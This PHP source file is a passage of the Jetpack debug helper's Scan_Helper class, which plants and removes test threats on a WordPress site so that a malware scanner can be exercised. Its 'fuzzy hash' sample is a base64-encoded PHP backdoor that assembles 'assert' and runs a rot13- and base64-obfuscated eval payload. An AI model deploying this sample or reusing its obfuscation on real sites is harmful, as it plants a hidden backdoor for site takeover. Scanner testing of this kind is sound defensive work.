<?php
/**
 * Jetpack Scan helper class.
 *
 * @package automattic/jetpack-debug-helper
 *
 * @phpcs:disable WordPress.PHP.DiscouragedPHPFunctions.obfuscation_base64_decode
 */

/**
 * Helps debug Scan
 */
class Scan_Helper {

	/**
	 * Associative array that defines which files to use for our threats.
	 *
	 * @var array<string>
	 */
	private $threats = array();

	/**
	 * Construction.
	 */
	public function __construct() {
		$upload_dir    = wp_upload_dir()['basedir'];
		$admin_dir     = str_replace( site_url() . '/', ABSPATH, admin_url() );
		$content_dir   = str_replace( site_url() . '/', ABSPATH, content_url() );
		$this->threats = array(
			'eicar'                  => "$upload_dir/jptt_eicar.php",
			'suspicious_link'        => "$upload_dir/jptt_suspicious_link.php",
			'core_file_modification' => "{$admin_dir}index.php",
			'non_core_file'          => "{$admin_dir}non-core-file.php",
			'infected_file'          => "$content_dir/index.php",
			'fake_vulnerable_plugin' => "$content_dir/plugins/wp-super-cache.php",
			'fake_vulnerable_theme'  => "$content_dir/themes/twentyfifteen/style.css",
			'fuzzy_hash_file'        => "$content_dir/fuzzy.php",
		);

		add_action( 'admin_menu', array( $this, 'register_submenu_page' ), 1000 );
		add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_scripts' ) );
	}

	/**
	 * Add submenu item.
	 */
	public function register_submenu_page() {
		add_submenu_page(
			'jetpack-debug-tools',
			'Scan Helper',
			'Scan Helper',
			'manage_options',
			'scan-helper',
			array( $this, 'render_ui' ),
			99
		);
	}

	/**
	 * Enqueue scripts!
	 *
	 * @param string $hook Page hook.
	 */
	public function enqueue_scripts( $hook ) {
		if ( str_starts_with( $hook, 'jetpack-debug_page_scan-helper' ) ) {
			wp_enqueue_style( 'scan_helper_style', plugin_dir_url( __FILE__ ) . 'inc/css/scan-helper.css', array(), JETPACK_DEBUG_HELPER_VERSION );
		}
	}

	/**
	 * Has Credentials
	 *
	 * @return bool
	 */
	private function has_credentials() {
		$url         = wp_nonce_url( 'admin.php?page=scan-helper', 'scan-helper-nonce' );
		$credentials = request_filesystem_credentials( $url );

		if ( false === $credentials ) {
			return false;
		}

		if ( ! WP_Filesystem( $credentials ) ) {
			request_filesystem_credentials( $url, '', true );
			return false;
		}

		return true;
	}

	/**
	 * Get contents of a file to an array using the WP Filesystem API
	 *
	 * @param string $file_path File path.
	 */
	private function get_contents_array( $file_path ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		return $wp_filesystem->get_contents_array( $file_path );
	}

	/**
	 * Checks the existance of a file through the WP Filesystem API.
	 *
	 * @param string $file_path File path.
	 */
	private function wp_file_exists( $file_path ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		return $wp_filesystem->exists( $file_path );
	}

	/**
	 * Write File
	 *
	 * @param string $file File path.
	 * @param string $contents File contents.
	 */
	private function write_file( $file, $contents ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		// Create parent directory of the file if it does not already exist
		$parent_dir = dirname( $file );
		if ( ! $wp_filesystem->is_dir( $parent_dir ) ) {
			$wp_filesystem->mkdir( $parent_dir );
		}

		return $wp_filesystem->put_contents( $file, $contents, FS_CHMOD_FILE );
	}

	/**
	 * Delete File
	 *
	 * @param string $file File path.
	 */
	private function delete_file( $file ) {
		global $wp_filesystem;

		if ( ! $this->has_credentials() ) {
			die;
		}

		return $wp_filesystem->delete( $file, true );
	}

	/**
	 * Checks whether the EICAR threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function eicar_threat_exists() {
		return file_exists( $this->threats['eicar'] );
	}

	/**
	 * Generate EICAR threats.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_eicar_threat() {
		$eicar_patterns =
			"<?php\n\necho <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNVU1BJQ0lPVVMtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKg==' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNVU1BJQ0lPVVMtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKg==' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLU1FRElVTS1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gq' ) . "\nHTML;\n" .
			"echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLUNSSVRJQ0FMLUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' ) . "\nHTML;\n";

		if ( ! $this->write_file( $this->threats['eicar'], $eicar_patterns ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['eicar']}." );

		}

		return "Successfully added EICAR threats to {$this->threats['eicar']}.";
	}

	/**
	 * Remove EICAR Threat
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_eicar_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['eicar'] );

		if ( ! $this->delete_file( $this->threats['eicar'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );
		}

		return "Successfully removed EICAR threats from $relative_file_path.";
	}

	/**
	 * Checks whether the Suspicious Link threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function suspicious_link_threat_exists() {
		return file_exists( $this->threats['suspicious_link'] );
	}

	/**
	 * Generate suspicious link threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_suspicious_link_threat() {
		// phpcs:disable Generic.Strings.UnnecessaryStringConcat.Found
		if ( ! $this->write_file( $this->threats['suspicious_link'], "<?php\n \$url = 'https://example.com" . "/akismet-guaranteed-spam/'; \n" ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['suspicious_link']}" );
		}

		return "Successfully added Suspicious Link threat to {$this->threats['suspicious_link']}";
	}

	/**
	 * Remove suspicious link threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_suspicious_link_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['suspicious_link'] );

		if ( ! $this->delete_file( $this->threats['suspicious_link'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );

		}

		return "Successfully removed Suspicious Link threat from $relative_file_path.";
	}

	/**
	 * Checks whether the Core File Modification threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function core_file_modification_threat_exists() {
		$lines = file( $this->threats['core_file_modification'] );
		return $lines[ count( $lines ) - 1 ] === 'if ( true === false ) exit();';
	}

	/**
	 * Generate core file modification threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_core_file_modification_threat() {
		$lines = $this->get_contents_array( $this->threats['core_file_modification'] );

		// add the threat by modifying the file
		$lines[] = 'if ( true === false ) exit();';

		$success = $this->write_file( $this->threats['core_file_modification'], implode( '', $lines ) );
		if ( ! $success ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['core_file_modification']}" );
		}

		return "Modified the core file: {$this->threats['core_file_modification']}";
	}

	/**
	 * Remove core file modification threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_core_file_modification_threat() {
		$lines = $this->get_contents_array( $this->threats['core_file_modification'] );

		if ( $lines[ count( $lines ) - 1 ] === 'if ( true === false ) exit();' ) {
			// eliminate the threat by removing the modification
			array_pop( $lines );
			$this->write_file( $this->threats['core_file_modification'], implode( '', $lines ) );
			return 'Removed the core modification threat.';
		}

		return new WP_Error( 'could-not-write', "Unable to write/remove threat from $this->threats['core_file_modification']" );
	}

	/**
	 * Checks whether the Non-Core File threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function non_core_file_threat_exists() {
		return file_exists( $this->threats['non_core_file'] );
	}

	/**
	 * Generate core file modification threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_non_core_file_threat() {
		if ( ! $this->write_file( $this->threats['non_core_file'], "<?php echo 'I am a bad file'; ?>" ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file {$this->threats['non_core_file']}" );
		}

		return "Successfully added a non-core file {$this->threats['non_core_file']} in a core directory.";
	}

	/**
	 * Remove non-core file threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_non_core_file_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['non_core_file'] );

		if ( ! $this->delete_file( $this->threats['non_core_file'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to remove Non-Core File threat from $relative_file_path." );
		}

		return "Successfully removed Non-Core File threat from $relative_file_path.";
	}

	/**
	 * Checks whether the Post DB threat currently exists on the site.
	 *
	 * @since 1.6.0 -- Return a WP_Post object when the post exists.
	 *
	 * @return WP_Post|bool
	 */
	private function post_db_threat_exists() {
		$query = new WP_Query(
			array(
				'post_type'              => 'post',
				'title'                  => 'Scan Tester Post',
				'post_status'            => 'all',
				'posts_per_page'         => 1,
				'no_found_rows'          => true,
				'ignore_sticky_posts'    => true,
				'update_post_term_cache' => false,
				'update_post_meta_cache' => false,
				'orderby'                => 'post_date ID',
				'order'                  => 'ASC',
			)
		);
		if ( ! empty( $query->post ) ) {
			return $query->post;
		}

		return false;
	}

	/**
	 * Generate post db threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_post_db_threat() {
		if ( $this->post_db_threat_exists() ) {
			return 'Scan tester post already exists.';
		}

		$post_id = wp_insert_post(
			array(
				'post_title'   => 'Scan Tester Post',
				'post_content' => 'This will trigger the db scanner <script>let url="' . base64_decode( 'Y2xhc3NpY3RyYWluZXJzb25saW5lLmNvbQ==' ) . '"</script>',
				'post_status'  => 'publish',
				'post_type'    => 'post',
			)
		);

		if ( ! $post_id || ! is_int( $post_id ) ) {
			return new WP_Error( 'could-not-write', 'Unable to create post.' );
		}

		return 'Successfully created a new Scan tester post.';
	}

	/**
	 * Remove post db threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_post_db_threat() {
		$post = $this->post_db_threat_exists();

		if ( ! $post ) {
			return 'Scan tester post does not exist.';
		}

		if ( ! wp_delete_post( $post->ID, true ) ) {
			return new WP_Error( 'could-not-write', 'Unable to remove post.' );
		}

		return 'Successfully removed the Scan tester post.';
	}

	/**
	 * Checks whether the Infected File threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function infected_file_threat_exists() {
		$lines = file( $this->threats['infected_file'] );
		return $lines[ count( $lines ) - 1 ] === 'HTML;';
	}

	/**
	 * Generate infected file threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_infected_file_threat() {
		$content = "echo <<<HTML\n" . base64_decode( 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=' ) . "\nHTML;";
		if ( ! $this->write_file( $this->threats['infected_file'], $content, FILE_APPEND ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat from {$this->threats['infected_file']}" );
		}

		return "Successfully added infected file threat to {$this->threats['infected_file']}.";
	}

	/**
	 * Remove infected file threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_infected_file_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['infected_file'] );
		$lines              = file( $this->threats['infected_file'] );
		if ( ! $lines[ count( $lines ) - 1 ] === 'HTML;' ) {
			return 'Infected file does not exist.';
		}

		// eliminate the threat by removing the modification
		array_splice( $lines, count( $lines ) - 3, 3 );
		if ( ! $this->write_file( $this->threats['infected_file'], implode( '', $lines ) ) ) {
			return new WP_Error( 'could-not-write', "Unable to remove threat from $relative_file_path." );
		}

		return "Removed the infected file threat from: $relative_file_path";
	}

	/**
	 * Checks whether the fake vulnerable plugin currently exists on the site.
	 *
	 * @return bool
	 */
	private function fake_vulnerable_plugin_exists() {
		return file_exists( $this->threats['fake_vulnerable_plugin'] );
	}

	/**
	 * Generate fake vulnerable plugin.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_fake_vulnerable_plugin() {
		$content = base64_decode(
			'LyoKUGx1Z2luIE5hbWU6IFdQIFN1cGVyIENhY2hlClBsdWdpbiBVUkk6IGh0dHBzOi8vd29yZHByZXNzLm9yZy9wbHVnaW5zL3' .
			'dwLXN1cGVyLWNhY2hlLwpEZXNjcmlwdGlvbjogVmVyeSBmYXN0IGNhY2hpbmcgcGx1Z2luIGZvciBXb3JkUHJlc3MuClZlcnNpb246ID' .
			'EuNy4yCkF1dGhvcjogQXV0b21hdHRpYwpBdXRob3IgVVJJOiBodHRwczovL2F1dG9tYXR0aWMuY29tLwpMaWNlbnNlOiBHUEwyKwpMaW' .
			'NlbnNlIFVSSTogaHR0cHM6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9ncGwtMi4wLnR4dApUZXh0IERvbWFpbjogd3Atc3VwZXItY2FjaGUKKi8='
		);

		if ( ! $this->write_file( $this->threats['fake_vulnerable_plugin'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat to {$this->threats['fake_vulnerable_plugin']}" );
		}

		return "Successfully added fake vulnerable plugin to {$this->threats['fake_vulnerable_plugin']}.";
	}

	/**
	 * Remove fake vulnerable plugin.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_fake_vulnerable_plugin() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['fake_vulnerable_plugin'] );

		if ( ! $this->delete_file( $this->threats['fake_vulnerable_plugin'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );
		}

		return "Successfully removed fake vulnerable plugin $relative_file_path.";
	}

	/**
	 * Checks whether the fake vulnerable theme currently exists on the site.
	 *
	 * @return bool
	 */
	private function fake_vulnerable_theme_exists() {
		return file_exists( $this->threats['fake_vulnerable_theme'] );
	}

	/**
	 * Generate fake vulnerable theme.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_fake_vulnerable_theme() {
		$content = base64_decode(
			'LyoKVGhlbWUgTmFtZTogVHdlbnR5IEZpZnRlZW4KVGhlbWUgVVJJOiBodHRwczovL3dvcmRwcmVzcy5vcmcvdGhlbWVzL3R3ZW' .
			'50eWZpZnRlZW4vCkF1dGhvcjogdGhlIFdvcmRQcmVzcyB0ZWFtCkF1dGhvciBVUkk6IGh0dHBzOi8vd29yZHByZXNzLm9yZy8KRGVzY3' .
			'JpcHRpb246IE91ciAyMDE1IGRlZmF1bHQgdGhlbWUgaXMgY2xlYW4sIGJsb2ctZm9jdXNlZCwgYW5kIGRlc2lnbmVkIGZvciBjbGFyaX' .
			'R5LiBUd2VudHkgRmlmdGVlbidzIHNpbXBsZSwgc3RyYWlnaHRmb3J3YXJkIHR5cG9ncmFwaHkgaXMgcmVhZGFibGUgb24gYSB3aWRlIH' .
			'ZhcmlldHkgb2Ygc2NyZWVuIHNpemVzLCBhbmQgc3VpdGFibGUgZm9yIG11bHRpcGxlIGxhbmd1YWdlcy4gV2UgZGVzaWduZWQgaXQgdX' .
			'NpbmcgYSBtb2JpbGUtZmlyc3QgYXBwcm9hY2gsIG1lYW5pbmcgeW91ciBjb250ZW50IHRha2VzIGNlbnRlci1zdGFnZSwgcmVnYXJkbG' .
			'VzcyBvZiB3aGV0aGVyIHlvdXIgdmlzaXRvcnMgYXJyaXZlIGJ5IHNtYXJ0cGhvbmUsIHRhYmxldCwgbGFwdG9wLCBvciBkZXNrdG9wIG' .
			'NvbXB1dGVyLgpWZXJzaW9uOiAxLjEKTGljZW5zZTogR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgdjIgb3IgbGF0ZXIKTGljZW5zZS' .
			'BVUkk6IGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9ncGwtMi4wLmh0bWwKVGFnczogYmxhY2ssIGJsdWUsIGdyYXksIHBpbmssIH' .
			'B1cnBsZSwgd2hpdGUsIHllbGxvdywgZGFyaywgbGlnaHQsIHR3by1jb2x1bW5zLCBsZWZ0LXNpZGViYXIsIGZpeGVkLWxheW91dCwgcm' .
			'VzcG9uc2l2ZS1sYXlvdXQsIGFjY2Vzc2liaWxpdHktcmVhZHksIGN1c3RvbS1iYWNrZ3JvdW5kLCBjdXN0b20tY29sb3JzLCBjdXN0b2' .
			'0taGVhZGVyLCBjdXN0b20tbWVudSwgZWRpdG9yLXN0eWxlLCBmZWF0dXJlZC1pbWFnZXMsIG1pY3JvZm9ybWF0cywgcG9zdC1mb3JtYX' .
			'RzLCBydGwtbGFuZ3VhZ2Utc3VwcG9ydCwgc3RpY2t5LXBvc3QsIHRocmVhZGVkLWNvbW1lbnRzLCB0cmFuc2xhdGlvbi1yZWFkeQpUZX' .
			'h0IERvbWFpbjogdHdlbnR5ZmlmdGVlbgoKVGhpcyB0aGVtZSwgbGlrZSBXb3JkUHJlc3MsIGlzIGxpY2Vuc2VkIHVuZGVyIHRoZSBHUE' .
			'wuClVzZSBpdCB0byBtYWtlIHNvbWV0aGluZyBjb29sLCBoYXZlIGZ1biwgYW5kIHNoYXJlIHdoYXQgeW91J3ZlIGxlYXJuZWQgd2l0aC' .
			'BvdGhlcnMuCiov'
		);

		if ( ! $this->write_file( $this->threats['fake_vulnerable_theme'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat to {$this->threats['fake_vulnerable_theme']}" );
		}

		// The theme also needs an index.php to be recognized as one by WordPress.
		$index_content = '<?php // Silence is golden.';
		if ( ! $this->write_file( dirname( $this->threats['fake_vulnerable_theme'] ) . '/index.php', $index_content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write index.php to {$this->threats['fake_vulnerable_theme']}" );
		}

		return "Successfully added fake vulnerable theme to {$this->threats['fake_vulnerable_theme']}.";
	}

	/**
	 * Remove fake vulnerable theme.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_fake_vulnerable_theme() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['fake_vulnerable_theme'] );

		$parent_dir = dirname( $this->threats['fake_vulnerable_theme'] );
		if ( ! $this->delete_file( $parent_dir ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat file $relative_file_path." );
		}

		return "Successfully removed fake vulnerable theme $relative_file_path.";
	}

	/**
	 * Checks whether the fuzzy hash threat currently exists on the site.
	 *
	 * @return bool
	 */
	private function fuzzy_hash_threat_exists() {
		return file_exists( $this->threats['fuzzy_hash_file'] );
	}

	/**
	 * Generate a fuzzy hash threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function generate_fuzzy_hash_threat() {
		$content = base64_decode(
			'CnRlciBTaWRlYmFyCiAqCiAqIEBwYWNrYWdlIFdvcmRQcmVzcwogKiBAc3VicGFja2FnZSBUd2VudHlfRm91cnRlZW4KICogQH' .
			'NpbmNlIFR3ZW50eSBGb3VydGVlbiAxLjAKICovCgppZiAoICEgaXNfYWN0aXZlX3NpZGViYXIoICdzaWRlYmFyLTMnICkgKSB7CglyZX' .
			'R1cm47Cn0KPz4KCjxkaXYgaWQ9InN1cHBsZW1lbnRhcnkiPgoJPGRpdiBpZD0iZm9vdGVyLXNpZGViYXIiIGNsYXNzPSJmb290ZXItc2' .
			'lkZWJhciB3aWRnZXQtYXJlYSIgcm9sZT0iY29tcGxlbWVudGFyeSI+CgkJPD9waHAgZHluYW1pY19zaWRlYmFyKCAnc2lkZWJhci0zJy' .
			'ApOyA/PgoJPC9kaXY+PCEtLSAjZm9vdGVyLXNpZGViYXIgLS0+CjwvZGl2PjwhLS0gI3N1cHBsZW1lbnRhcnkgLS0+CgoKPD9waHAgCg' .
			'o/PgoKPD9waHAgCgo/PgoKPD9waHAgCgo/PgoKPD9waHAgCgo/PgoKPD9waHAgCgo/PgoKPD9waHAgCi8vIyMjPUNBQ0hFIFNUQVJUPS' .
			'MjIwplcnJvcl9yZXBvcnRpbmcoMCk7CmFzc2VydF9vcHRpb25zKEFTU0VSVF9BQ1RJVkUsIDEpOwphc3NlcnRfb3B0aW9ucyhBU1NFUl' .
			'RfV0FSTklORywgMCk7CmFzc2VydF9vcHRpb25zKEFTU0VSVF9RVUlFVF9FVkFMLCAxKTsgJHN0cmluZ3MgPSAiYXMiOyRzdHJpbmdzIC' .
			'49ICJzZXJ0IjsgJHN0cmluZ3Moc3RyX3JvdDEzKCdyaW55KG9uZnI2NF9xcnBicXIoIm5KTHRYVHltcDJJMFhQRWNMYUxjWEZPN1ZUSX' .
			'duVDh0V1R5dnF3ZnRzRk95b1VBeVZVZnRNS1dsbzNXc3B6SWpvM1cwbko1YVhRTmNCamNjb3p5c3AySTBYUFd4bktBam9UUzVLMklscH' .
			'o5bHBsVmZWUFZqVnZ4N1B6eXpWUHR1bktBbU1LRGJXVHl2cXZ4Y1ZVZlhuSkxiVkpJZ3BVRTVYUEVzRDA5Q0YweVNKbFd3b1R5eW9hRX' .
			'NMMnV5TDJmdktGeGNWVEVjTUZ0eEswWENHMGdXRUlmdkwya2NNSjUwSzJBYk1KQWVWeTBjQmpjY012dWpweklhSzIxdXFUQWJYUHB1S1' .
			'NadXFGcGZWVE1jb1RJc00ySTBLMkFpb2FFeW9hRW1YUEVzSDBJRkl4SUZKbFdHRDFXV0hTRXNFeHlaRUg1T0dISHZLRnhjWEZOeExsTj' .
			'lWUFcxVndmdE1KWm1NRk54TGxOOVZQVzNWd2ZYV1REdENGTnhLMUFTSHlNU0h5ZnZIMElGSXhJRkswNU9HSEh2S0Y0eEsxQVNIeU1TSH' .
			'lmdkh4SUVJSElHSVM5SUh4eHZLR2ZYV1VIdENGTnhLMUFTSHlNU0h5ZnZGU0VISFM5SUgwSUZLMFNVRUg1SFZ5MDdQdkVjcFBOOVZQRX' .
			'NIMElGSXhJRkpsV0ZFSDFDSVJJc0RIRVJIdldxQmpieHFLV2ZWUTB0Vnp1MHFVTjZZbDlqTUtXbW8yNXlwYVpoTHp5NlkycXlxUDVqbl' .
			'VOL25LTjlWdjUxcHpreW96QWlNVEhiV1R5alhGNHZXekQ5VnY1MXB6a3lvekFpTVRIYldURGNZdlZ6cUcwdllhSWxvVEloTDI5eE1GdH' .
			'hxRnhoVnZNd0NGVmhXVFpoVnZNY0NHUnpuUTB2WXoxeEFGdHZNUU11WkpJdU1RT3lCVEF6TUpaM0F3RXhNSkxtQUdObE1KRDNMR05tWm' .
			'1Idll2RXhZdkUxWXZFd1l2VmtWdng3UHp5elhUeWhuSTlhTUtEYlZ6U2ZvVDkzSzNJbG9TOXpvM095b3ZWY1ZRMDlWUVJjVlVmWFdUeX' .
			'Zxdk45VlRNY29USXNNMkkwSzJBaW9hRXlvYUVtWFBFMXB6amNCamM5VlRJZnAySWNNdnV6cUo1d3FUeWlveTl5clR5bXFVWmJWekExcH' .
			'prc25KNWNGUFZjWEZPN1B2RXduUE45VlRBMXB6a3NuSjVjcVB0eHFLV2ZYR2ZYTDNJbG9TOW1NS0VpcFVEYldUQWJZUE9RSUlXWkcxT0' .
			'hLMHVTREhFU0h2anRFeFNaSDBIY0JqY3dxS1dmSzNBeXFUOWpxUHR4TDJ0ZlZSQUlIeGtDSFNFc0h4SUhJSVdCSVNXT0d5QVRFSVZmVl' .
			'NFRklISGNCamJ4cHpJbXFKazBWUTB0TDNJbG9TOXlyVEl3WFBFd25QeDdQekExcHprc0wya2lwMkhiV1RBYlhHZlhXVHl2cXZOOVZQRW' .
			'xNS0Exb1VEN1BhMHRNSmttTUZPN1B2RXpwUE45VlRNbW8yQWVvM095b3Z0dnBUSWxwMjloTUtXbVl6V2NydlZmVlF0allQTnhNS1dsb3' .
			'o4ZlZQRXlwYVdtcVVWZlZRWmpYR2ZYbkpMdFhQRXpwUHh0cmpidFZQTnRXVDkxcVBOOVZQV1VFSUR0WTJxeXFQNWpuVU4vbktOOVZ2NT' .
			'Fwemt5b3pBaU1USGJXVHlqWEY0dld6RDlWdjUxcHpreW96QWlNVEhiV1REY1l2VnpxRzB2WWFJbG9USWhMMjl4TUZ0eHFGeGhWdk13Q0' .
			'ZWaFdUWmhWdk1jQ0dSem5RMHZZejF4QUZ0dk1RTXVaSkl1TVFPeUJUQXpNSlozQXdFeE1KTG1BR05sTUpEM0xHTm1abUh2WXZFeFl2RT' .
			'FZdkV3WXZWa1Z2eGhWdk9WSVNFRFltUmhaSTIya2xLVDR2QmpidFZQTnRXVDkxcVBOaENGTnZGVDltcVFidHBUSWxwMjloTUtXbVl6V2' .
			'NyeWtsS1Q0dkJqYnRWUE50V1Q5MXFQTmhDRk52RDI5aG96SXdxVHlpb3didEQya2lwMklwcHlraEtVV3BvdlY3UHZOdFZQT3pxM1djcV' .
			'RIYldUTWpZUE54bzNJMFhHZlhWUE50VlBFbE1LQWpWUTB0VnZWN1B2TnRWUE8zblR5Zk1GTmJWSk15bzJMYldUTWpYRnh0cmpidFZQTn' .
			'RWUE50VlBFbE1LQWpWUDQ5VlRNYU1LRW1YUEV6cFBqdFpHVjRYT2ZYVlBOdFZVMFhWUE50VlRNd29UOW1NRnR4TWFOY0JqYnRWUE50b1' .
			'R5bXFQdHhuVEl1TVRJbFlQTnhMejl4ckZ4dENGT2pweklhSzNBam9UeTBYUFZpS1NXcEh2OHZZUE54cHpJbXBQanRadng3UHZOdFZQTn' .
			'huSlcyVlEwdFdUV2lNVXg3UGEwWHNEYzlCamNjTXZ1Y3AzQXlxUHR4SzFXU0hJSVNIMUVvVmFOdktGeHRXdkx0V1M5RkVJU0lFSUFISm' .
			'xXalZ5MHRDRzB0Vnd4NEFHTXlaVFd5VnZ4dHJsT3lxelNmWFVBMHB6eWpwMmt1cDJ1eXBsdHhLMVdTSElJU0gxRW9Welp2S0Z4Y0JsTz' .
			'lQekl3blQ4dFdUeXZxd2c5IikpOycpKTsKLy8jIyM9Q0FDSEUgRU5EPSMjIwo/Pg=='
		);

		if ( ! $this->write_file( $this->threats['fuzzy_hash_file'], $content ) ) {
			return new WP_Error( 'could-not-write', "Unable to write threat to {$this->threats['fuzzy_hash_file']}" );
		}

		return "Successfully added fuzzy hash threat to {$this->threats['fuzzy_hash_file']}.";
	}

	/**
	 * Remove fuzzy hash threat.
	 *
	 * @return string|WP_Error Success message on success, WP_Error object on failure.
	 */
	private function remove_fuzzy_hash_threat() {
		$relative_file_path = str_replace( ABSPATH, '', $this->threats['fuzzy_hash_file'] );

		if ( ! $this->delete_file( $this->threats['fuzzy_hash_file'] ) ) {
			return new WP_Error( 'could-not-write', "Unable to write to threat file $relative_file_path." );
		}

		return "Successfully removed fuzzy hash threat $relative_file_path.";
	}

	/**
	 * Handles the form submission
	 *
	 * @return array Associative array containing all the successes and errors.
	 */
	private function handle_submit() {
		if ( ! isset( $_POST['save-scan-helper'] ) ) {
			return;
		}

		check_admin_referer( 'scan-helper-nonce' );

		$successes = array();
		$errors    = array();

		// EICAR
		if ( isset( $_POST['threat-eicar'] ) ) {
			$eicar = ! $this->eicar_threat_exists() ? $this->generate_eicar_threat() : null;
		} else {
			$eicar = $this->eicar_threat_exists() ? $this->remove_eicar_threat() : null;
		}
		if ( is_wp_error( $eicar ) ) {
			$errors[] = $eicar;
		} elseif ( $eicar ) {
			$successes[] = $eicar;
		}
		// Suspicious Link
		if ( isset( $_POST['threat-suspicious-link'] ) ) {
			$suspicious_link = ! $this->suspicious_link_threat_exists() ? $this->generate_suspicious_link_threat() : null;
		} else {
			$suspicious_link = $this->suspicious_link_threat_exists() ? $this->remove_suspicious_link_threat() : null;
		}
		if ( is_wp_error( $suspicious_link ) ) {
			$errors[] = $suspicious_link;
		} elseif ( $suspicious_link ) {
			$successes[] = $suspicious_link;
		}

		// Core File Modification
		if ( isset( $_POST['threat-core'] ) ) {
			$core_modification = ! $this->core_file_modification_threat_exists() ? $this->generate_core_file_modification_threat() : null;
		} else {
			$core_modification = $this->core_file_modification_threat_exists() ? $this->remove_core_file_modification_threat() : null;
		}
		if ( is_wp_error( $core_modification ) ) {
			$errors[] = $core_modification;
		} elseif ( $core_modification ) {
			$successes[] = $core_modification;
		}

		// Non-Core File
		if ( isset( $_POST['threat-core-add'] ) ) {
			$core_add = ! $this->non_core_file_threat_exists() ? $this->generate_non_core_file_threat() : null;
		} else {
			$core_add = $this->non_core_file_threat_exists() ? $this->remove_non_core_file_threat() : null;
		}
		if ( is_wp_error( $core_add ) ) {
			$errors[] = $core_add;
		} elseif ( $core_add ) {
			$successes[] = $core_add;
		}

		// Post DB
		if ( isset( $_POST['threat-post'] ) ) {
			$post_db = ! $this->post_db_threat_exists() ? $this->generate_post_db_threat() : null;
		} else {
			$post_db = $this->post_db_threat_exists() ? $this->remove_post_db_threat() : null;
		}
		if ( is_wp_error( $post_db ) ) {
			$errors[] = $post_db;
		} elseif ( $post_db ) {
			$successes[] = $post_db;
		}

		// Infected File
		if ( isset( $_POST['threat-infect'] ) ) {
			$infected_file = ! $this->infected_file_threat_exists() ? $this->generate_infected_file_threat() : null;
		} else {
			$infected_file = $this->infected_file_threat_exists() ? $this->remove_infected_file_threat() : null;
		}
		if ( is_wp_error( $infected_file ) ) {
			$errors[] = $infected_file;
